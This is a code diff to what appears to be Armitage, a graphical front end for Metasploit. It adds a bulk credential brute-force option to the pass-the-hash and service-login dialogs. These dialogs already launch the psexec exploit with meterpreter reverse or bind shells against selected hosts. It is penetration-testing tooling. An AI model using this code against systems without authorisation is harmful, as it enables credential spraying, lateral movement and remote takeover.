@@ -51,18 +51,6 @@ import table.*;
 	}
 };
 
-sub explode_cred {
-	local('$t %r $key $value $v');
-	$t = split('\s+', $1);
-	foreach $v ($t) {
-		if ('=' isin $v) {
-			($key, $value) = split('=', $v);
-			%r[$key] = $value;
-		}
-	}
-	return %r;
-}
-
 sub refreshCredsTable {
 	thread(lambda({
 		[Thread yield];
@@ -79,7 +67,7 @@ sub refreshCredsTable {
 sub show_hashes {
 	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain');	
 
-	$dialog = dialog($1, 480, 320);
+	$dialog = dialog($1, 480, $2);
 
         $model = [new GenericTableModel: @("user", "pass", "host"), "user", 128];
  	
@@ -97,7 +85,7 @@ sub show_hashes {
 
 sub createCredentialsTab {
 	local('$dialog $table $model $panel $export $crack $refresh');
-	($dialog, $table, $model) = show_hashes("");
+	($dialog, $table, $model) = show_hashes("", 320);
 	[$dialog removeAll];
 
 	$panel = [new JPanel];
@@ -136,18 +124,20 @@ sub createCredentialsTab {
 }
 
 sub pass_the_hash {
-	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2');	
+	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls');	
 
-	($dialog, $table, $model) = show_hashes("Pass the Hash");
+	($dialog, $table, $model) = show_hashes("Pass the Hash", 360);
 	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
 
 	$bottom = [new JPanel];
-	[$bottom setLayout: [new GridLayout: 4, 1]];
+	#[$bottom setLayout: [new GridLayout: 4, 1]];
+	[$bottom setLayout: [new BoxLayout: $bottom, [BoxLayout Y_AXIS]]];
 
 	$user = [new JTextField: 32];
 	$pass = [new JTextField: 32];
 	$domain = [new JTextField: 32];
 	[$domain setText: "WORKGROUP"];
+	$brute = [new JCheckBox: "Check all credentials"];
 
 	$button = [new JButton: "Launch"];
 
@@ -158,34 +148,50 @@ sub pass_the_hash {
 
 	$reverse = [new JCheckBox: "Use reverse connection"];
 
+	@controls = @($user, $pass, $reverse);
+
+	[$brute addActionListener: lambda({
+		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
+	}, \$brute, \@controls)];
+
 	[$bottom add: label_for("User", 75, $user)];
 	[$bottom add: label_for("Pass", 75, $pass)];
 	[$bottom add: label_for("Domain", 75, $domain)];
-	[$bottom add: $reverse];
+	[$bottom add: left($brute)];
+	[$bottom add: left($reverse)];
 
 	[$button addActionListener: lambda({
 		local('$u $p %options $host');
 		%options["SMBDomain"] = [$domain getText];
-		%options["SMBUser"] = [$user getText];
-		%options["SMBPass"] = [$pass getText];
-
-		if ([$reverse isSelected]) {
-			%options["LHOST"] = $MY_ADDRESS;
-			%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
-		}	
+		
+		if ([$brute isSelected]) {
+			%options["RHOSTS"] = join(", ", $hosts);
+			%options["USERPASS_FILE"] = createUserPassFile(convertAll([$model getRows]), "smb_hash");
+			elog("brute force smb @ " . %options["RHOSTS"]);
+			launchBruteForce("auxiliary", "scanner/smb/smb_login", %options, "brute smb");
+		}
 		else {
-			%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
-		}
-		%options["LPORT"] = randomPort();
+			%options["SMBUser"] = [$user getText];
+			%options["SMBPass"] = [$pass getText];
 
-		foreach $host ($hosts) {
-			%options["RHOST"] = $host;
-			warn(%options);
-			call_async($client, "module.execute", "exploit", "windows/smb/psexec", %options);
+			if ([$reverse isSelected]) {
+				%options["LHOST"] = $MY_ADDRESS;
+				%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
+			}	
+			else {
+				%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
+			}
+			%options["LPORT"] = randomPort();
+
+			foreach $host ($hosts) {
+				%options["RHOST"] = $host;
+				warn(%options);
+				call_async($client, "module.execute", "exploit", "windows/smb/psexec", %options);
+			}
+			elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));
 		}
-		elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));
 		[$dialog setVisible: 0];
-	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts)];
+	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts, \$brute, \$model)];
 
 	$b2 = [new JPanel];
 	[$b2 setLayout: [new BorderLayout]];
@@ -203,16 +209,18 @@ sub show_login_dialog {
 	local('$port $srvc');
 	($port, $srvc) = values($service, @("port", "name"));
 
-	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2');	
+	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2 $brute @controls');
 
-	($dialog, $table, $model) = show_hashes("login");
+	($dialog, $table, $model) = show_hashes("login", 320);
 	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
 
 	$bottom = [new JPanel];
-	[$bottom setLayout: [new GridLayout: 2, 1]];
+	[$bottom setLayout: [new GridLayout: 3, 1]];
 
 	$user = [new JTextField: 32];
 	$pass = [new JTextField: 32];
+	$brute = [new JCheckBox: "Check all credentials"];
+	@controls = @($user, $pass);
 
 	$button = [new JButton: "Launch"];
 
@@ -223,19 +231,31 @@ sub show_login_dialog {
 
 	[$bottom add: label_for("User", 75, $user)];
 	[$bottom add: label_for("Pass", 75, $pass)];
+	[$bottom add: $brute];
+
+	[$brute addActionListener: lambda({
+		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
+	}, \$brute, \@controls)];
 
 	[$button addActionListener: lambda({
 		local('$u $p %options $host');
-		%options["USERNAME"] = [$user getText];
-		%options["PASSWORD"] = [$pass getText];
 		%options["RHOSTS"] = join(', ', $hosts);
 		%options["RPORT"] = $port;
-		%options["BLANK_PASSWORDS"] = "0";
-		warn("$srvc $+ : $port => " . %options);
-		elog("login $srvc with " . [$user getText] . ":" . [$pass getText] . " @ " . %options["RHOSTS"]);
-		call_async($client, "module.execute", "auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
+		if ([$brute isSelected]) {
+			%options["USERPASS_FILE"] = createUserPassFile(convertAll([$model getRows]));
+			elog("brute force $srvc @ " . %options["RHOSTS"]);
+			launchBruteForce("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options, "brute $srvc");
+		}
+		else {
+			%options["USERNAME"] = [$user getText];
+			%options["PASSWORD"] = [$pass getText];
+			%options["BLANK_PASSWORDS"] = "0";
+			warn("$srvc $+ : $port => " . %options);
+			elog("login $srvc with " . [$user getText] . ":" . [$pass getText] . " @ " . %options["RHOSTS"]);
+			call_async($client, "module.execute", "auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
+		}
 		[$dialog setVisible: 0];
-	}, \$dialog, \$user, \$pass, \$hosts, \$srvc, \$port)];
+	}, \$dialog, \$user, \$pass, \$hosts, \$srvc, \$port, \$brute, \$model)];
 
 	$b2 = [new JPanel];
 	[$b2 setLayout: [new BorderLayout]];
@@ -248,3 +268,40 @@ sub show_login_dialog {
 	[$dialog setVisible: 1];
 }
 
+sub createUserPassFile {
+	local('$handle $user $pass $type $row $2');
+	$handle = openf(">userpass.txt");
+	foreach $row ($1) {
+		($user, $pass, $type) = values($row, @("user", "pass", "type"));
+		if ($type eq "password" || $type eq $2) {
+			println($handle, "$user $pass");
+		}
+		else {
+			println($handle, "$user");
+		}
+	}	
+	closef($handle);
+
+	if ($client !is $mclient) {
+		local('$file');
+		$file = uploadFile("userpass.txt");
+		deleteFile("userpass.txt");
+		return $file;
+	}
+	else {
+		return getFileProper("userpass.txt");
+	}
+}
+
+# launchBruteForce("auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
+sub launchBruteForce {
+	local('$console $key $value');
+	$console = createConsoleTab("$4", 1, $host => "all", $file => "brute_login");
+	[$console sendString: "use $1 $+ / $+ $2 $+ \n"];
+	foreach $key => $value ($3) {
+		$value = strrep($value, '\\', '\\\\');
+		[$console sendString: "set $key $value $+ \n"];
+	}
+	[$console sendString: "set REMOVE_USERPASS_FILE true\n"];
+	[$console sendString: "run\n"];
+}
